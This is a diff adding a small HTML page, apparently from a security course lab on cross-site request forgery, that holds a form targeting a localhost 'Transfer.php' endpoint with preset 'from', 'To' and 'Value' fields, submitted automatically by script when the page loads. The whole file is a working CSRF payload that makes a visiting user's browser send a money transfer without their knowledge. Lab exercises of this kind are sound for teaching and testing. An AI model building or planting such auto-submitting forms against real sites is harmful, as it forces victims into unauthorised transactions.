@@ -1,0 +1,9 @@
+<form name="formName" action="http://localhost/SAD/08%20-%20CSRF/Transfer.php" method="POST">
+    <input type="number" name="from" value="5"><br>
+    <input type="number" name="To" value="1"><br>
+    <input type="number" name="Value" value="100"><br>
+</form>
+
+<script>
+    document.formName.submit();
+</script>
